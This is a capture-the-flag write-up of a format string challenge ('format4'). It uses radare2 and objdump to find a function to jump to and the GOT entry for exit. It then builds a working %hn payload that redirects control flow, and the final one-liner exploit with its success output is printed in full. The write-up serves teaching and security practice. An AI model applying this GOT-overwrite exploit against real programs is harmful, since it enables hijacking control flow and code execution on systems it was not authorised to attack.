Here we go with the last challenge of format string, we'll see that this time instead of modifying a value we will have to learn how to modify the control flow. First let's do the analysis and we'll see different places where we can set a pointer to a function. Let's open the binary in radare2:
    $ radare2 format4
    > aaa
    > afl
    > s main
    > pdf

We can see that the main function as previous challenges the only thing it does is to call the function sym.vuln, let's gonna see what is inside that function:
    > s sym.vuln
    > pdf
    > afvn buffer format
    > pdf

Again we have a buffer of 512 bytes, and this time instead of calling a function that calls printf, it calls printf directly, and again giving the buffer directly instead of a string and the buffer.
This time, we have another function:
    > afl
    > s sym.hello
    > pdf

Here we have a code that prints the string "code execution redirected! you win". This is in the address 0x080484b4. So we will redirect the execution, how can we execute that function?
There are various places, for example modifying a pointer from the .got table that contains the address of functions to execute, so if we can modify the address of exit in the .got table and when sym.vuln calls exit(1) we could jump to the function.
Or we could modify the address of the destructor of the function, that is a list of pointer to execute at the end of the program.
Here as it calls exit, we will modify the address of that pointer in the .got. To do that, we will apply the algorithm seen in previous exercise to write the address of sym.hello function.

Address of function to write = 0x080484b4

    LOB = 0x84b4 = 33972
    HOB = 0x0804 = 2052
    HOB - 8 = 2052 - 8 = 2044
    LOB - HOB = 33972 - 2052 = 31920
    address = 0x08049724
    address + 2 = 0x08049726
    offset = 0xbfffef30 - 0xbfffef20 = 0x10 / 4 = 4
    offset + 1 = 5

Address was obtained with objdump:

    objdump -TR ./format4

And we get the address from exit, and now apply the algorithm that we saw in previous challenge:

    $ python -c 'print "\x26\x97\x04\x08" + "\x24\x97\x04\x08" + "%.2044x%4$hn" + "%.31920x%5$hn"' | ./format4
    ...
    code execution redirected! you win
